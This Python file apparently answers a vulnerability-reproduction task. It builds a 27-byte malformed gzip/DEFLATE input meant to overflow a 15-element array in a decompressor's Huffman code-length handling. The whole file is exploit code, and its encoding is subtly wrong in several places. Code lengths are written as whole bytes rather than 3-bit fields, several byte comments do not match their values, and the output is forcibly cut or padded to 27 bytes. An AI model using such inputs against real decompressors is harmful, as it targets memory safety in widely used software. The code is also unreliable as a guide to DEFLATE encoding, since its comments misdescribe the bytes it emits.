import os
import tarfile
import tempfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a gzip header
        # ID1 + ID2 (gzip magic)
        poc = bytearray([0x1f, 0x8b])
        
        # Compression method (8 = deflate)
        poc.append(8)
        
        # Flags (0 for no extra fields)
        poc.append(0)
        
        # MTIME (4 bytes, 0 for no timestamp)
        poc.extend([0, 0, 0, 0])
        
        # XFL (2 = max compression, but not critical)
        poc.append(2)
        
        # OS (255 = unknown)
        poc.append(255)
        
        # DEFLATE block:
        # Final block, dynamic Huffman codes
        poc.append(0x85)  # 10000101 = 1 (final) 01 (dynamic) 00000 (padding)
        
        # HLIT = 0 -> 257 literal codes (minimum is 257)
        # HDIST = 0 -> 1 distance code
        # HCLEN = 15 -> 19 code length codes
        poc.append(0xf0)  # 00001111 00000000
        
        # HCLEN bits: 15 = 19 code lengths to follow
        # We set up to overflow the temporary 15-element array
        # The code length alphabet has 19 possible symbols
        # Send 19 code lengths (3 bits each)
        
        # Code length sequence for code length alphabet (19 values)
        # We need code lengths that will cause tree construction
        # to exceed the 15-element temporary array
        code_lengths = [
            7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7
        ]
        
        # The order of code length codes is special in DEFLATE:
        # 16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15
        # We need to map our values to this order
        
        # Encode 19 code lengths (3 bits each)
        for i in range(19):
            # Get the actual position in the DEFLATE order
            if i < len(code_lengths):
                val = code_lengths[i]
            else:
                val = 0
            poc.append(val & 0x07)
        
        # Literal/length code lengths (using code 18 repeat for zeros)
        # We need to specify 257 literal codes
        # Use code 18 (repeat zero 11-138 times) to specify many zeros
        poc.append(0x92)  # 10010010 = code 18 with 2 extra bits (11 + 2 = 13 zeros)
        poc.append(0x00)  # padding
        
        # End of block code (256) - use a valid code
        poc.append(0x00)
        
        # CRC32 (fake) and uncompressed size (fake)
        poc.extend([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
        
        # Ensure length is exactly 27 bytes
        if len(poc) > 27:
            poc = poc[:27]
        elif len(poc) < 27:
            poc.extend([0] * (27 - len(poc)))
        
        return bytes(poc)
